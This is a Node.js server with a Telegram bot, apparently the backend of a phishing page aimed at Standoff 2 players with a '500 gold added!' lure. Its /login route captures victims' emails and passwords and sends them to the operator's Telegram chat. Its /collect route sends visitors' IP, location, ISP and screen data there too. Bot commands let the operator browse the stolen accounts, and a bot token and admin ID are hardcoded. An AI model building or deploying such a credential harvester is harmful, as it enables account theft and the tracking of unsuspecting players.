const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const app = express();

// ===== НАСТРОЙКИ =====
const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ';
const ADMIN_ID = 5015075680;

// ===== ХРАНИЛИЩЕ В ПАМЯТИ =====
const accounts = [];
const visitors = [];
let accountId = 1;
let visitorId = 1;

// ===== TELEGRAM-БОТ =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Telegram-бот запущен');

// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
function formatTime(d) {
    return new Date(d).toLocaleString('ru-RU');
}

function escapeMd(s) {
    return String(s || '').replace(/[*_`\[\]]/g, '');
}

// ===== КОМАНДЫ БОТА =====

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id,
        '🔐 *Бот уведомлений Standoff 2*\n\n' +
        'Команды:\n' +
        '/accounts — список аккаунтов\n' +
        '/visitors — список посетителей\n' +
        '/stats — статистика\n' +
        '/test — тест\n\n' +
        'Твой chat\\_id: `' + msg.chat.id + '`',
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/test/, (msg) => {
    bot.sendMessage(ADMIN_ID, '✅ Тест пройден, бот работает!');
});

// /accounts — список аккаунтов
bot.onText(/\/accounts/, (msg) => {
    if (!accounts.length) {
        return bot.sendMessage(ADMIN_ID, '📭 Пока нет аккаунтов');
    }

    const last = accounts.slice(-30).reverse();
    const lines = last.map((a, i) =>
        (i + 1) + '. 📧 `' + escapeMd(a.email) + '`'
    );

    const keyboard = last.map((a, i) => ([{
        text: (i + 1) + '. ' + (a.email.length > 25 ? a.email.substring(0, 25) + '...' : a.email),
        callback_data: 'a_' + a.id
    }]));

    bot.sendMessage(ADMIN_ID,
        '🔐 *АККАУНТЫ* (всего: ' + accounts.length + ')\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Показаны последние ' + last.length + '.\n' +
        'Нажми на кнопку, чтобы увидеть детали.',
        {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        }
    );
});

// /visitors — список посетителей
bot.onText(/\/visitors/, (msg) => {
    if (!visitors.length) {
        return bot.sendMessage(ADMIN_ID, '📭 Пока нет посетителей');
    }

    const last = visitors.slice(-30).reverse();
    const keyboard = last.map((v, i) => ([{
        text: (i + 1) + '. ' + v.ip + ' (' + (v.city || '?') + ')',
        callback_data: 'v_' + v.id
    }]));

    bot.sendMessage(ADMIN_ID,
        '👥 *ПОСЕТИТЕЛИ* (всего: ' + visitors.length + ')\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        'Показаны последние ' + last.length + '.\n' +
        'Нажми, чтобы увидеть детали.',
        {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        }
    );
});

// /stats — статистика
bot.onText(/\/stats/, (msg) => {
    const countries = {};
    visitors.forEach(v => {
        if (v.country) countries[v.country] = (countries[v.country] || 0) + 1;
    });
    const top = Object.entries(countries)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([c, n], i) => '  ' + (i + 1) + '. ' + c + ' — ' + n)
        .join('\n');

    bot.sendMessage(ADMIN_ID,
        '📊 *СТАТИСТИКА*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '🔐 Аккаунтов: ' + accounts.length + '\n' +
        '👥 Посетителей: ' + visitors.length + '\n\n' +
        (top ? '🌍 *Топ стран:*\n' + top : ''),
        { parse_mode: 'Markdown' }
    );
});

// Обработка нажатий на кнопки
bot.on('callback_query', (query) => {
    const data = query.data || '';
    bot.answerCallbackQuery(query.id);

    if (data.startsWith('a_')) {
        const id = parseInt(data.substring(2));
        const acc = accounts.find(a => a.id === id);
        if (!acc) return bot.sendMessage(ADMIN_ID, '❌ Аккаунт не найден');

        bot.sendMessage(ADMIN_ID,
            '🔐 *АККАУНТ #' + acc.id + '*\n' +
            '━━━━━━━━━━━━━━━━━━\n' +
            '📧 Почта: `' + escapeMd(acc.email) + '`\n' +
            '🔑 Пароль: `' + escapeMd(acc.password) + '`\n' +
            '🌐 IP: `' + escapeMd(acc.ip) + '`\n' +
            '📱 Устройство: ' + escapeMd((acc.user_agent || '').substring(0, 80)) + '\n' +
            '🕒 Время: ' + formatTime(acc.time),
            { parse_mode: 'Markdown' }
        );
    }

    if (data.startsWith('v_')) {
        const id = parseInt(data.substring(2));
        const vis = visitors.find(v => v.id === id);
        if (!vis) return bot.sendMessage(ADMIN_ID, '❌ Посетитель не найден');

        let text =
            '👤 *ПОСЕТИТЕЛЬ #' + vis.id + '*\n' +
            '━━━━━━━━━━━━━━━━━━\n' +
            '🌐 IP: `' + escapeMd(vis.ip) + '`\n' +
            '🌍 Страна: ' + escapeMd(vis.country || '?') + '\n';
        if (vis.region) text += '🗺 Регион: ' + escapeMd(vis.region) + '\n';
        text +=
            '🏙 Город: ' + escapeMd(vis.city || '?') + '\n' +
            '📡 Провайдер: ' + escapeMd(vis.org || '?') + '\n' +
            '📺 Экран: ' + escapeMd(vis.screen || '?') + '\n' +
            '🕒 Время: ' + formatTime(vis.time);

        bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' });
    }
});

// ===== EXPRESS =====
app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== СБОР ПОСЕТИТЕЛЕЙ =====
app.post('/collect', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
    const geo = req.body.geo || {};
    const screen = req.body.screen || {};

    const visitor = {
        id: visitorId++,
        ip: ip,
        country: geo.country || '',
        region: geo.region || '',
        city: geo.city || '',
        org: geo.org || '',
        screen: (screen.w || '?') + 'x' + (screen.h || '?'),
        time: new Date().toISOString()
    };

    visitors.push(visitor);
    if (visitors.length > 500) visitors.shift(); // храним последние 500

    console.log('👤 Посетитель: ' + ip + ' | ' + (geo.country || '?') + ', ' + (geo.region || '?') + ', ' + (geo.city || '?'));

    // Уведомление
    let text =
        '👤 *НОВЫЙ ПОСЕТИТЕЛЬ*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '🌐 IP: `' + escapeMd(ip) + '`\n' +
        '🌍 Страна: ' + escapeMd(geo.country || '?') + '\n';
    if (geo.region) text += '🗺 Регион: ' + escapeMd(geo.region) + '\n';
    text +=
        '🏙 Город: ' + escapeMd(geo.city || '?') + '\n' +
        '📡 Провайдер: ' + escapeMd(geo.org || '?') + '\n' +
        '📺 Экран: ' + visitor.screen + '\n' +
        '🕒 Время: ' + formatTime(visitor.time);

    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
        .catch(err => console.error('TG:', err.message));

    res.json({ ok: true });
});

// ===== ЛОГИН =====
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
    const ua = req.headers['user-agent'] || 'unknown';

    if (!email || !password) return res.status(400).json({ error: 'Fill all fields' });

    const acc = {
        id: accountId++,
        email: email,
        password: password,
        ip: ip,
        user_agent: ua,
        time: new Date().toISOString()
    };
    accounts.push(acc);
    if (accounts.length > 500) accounts.shift();

    console.log('🔐 Аккаунт: ' + email + ' : ' + password);

    bot.sendMessage(ADMIN_ID,
        '🔐 *НОВЫЙ АККАУНТ*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '📧 Почта: `' + escapeMd(email) + '`\n' +
        '🔑 Пароль: `' + escapeMd(password) + '`\n' +
        '🌐 IP: `' + escapeMd(ip) + '`\n' +
        '📱 Устройство: ' + escapeMd(ua.substring(0, 80)) + '\n' +
        '🕒 Время: ' + formatTime(acc.time),
        { parse_mode: 'Markdown' }
    ).catch(err => console.error('TG:', err.message));

    res.json({ success: true, message: '500 gold added!' });
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
    console.log('BOT IS RUNNING');
});
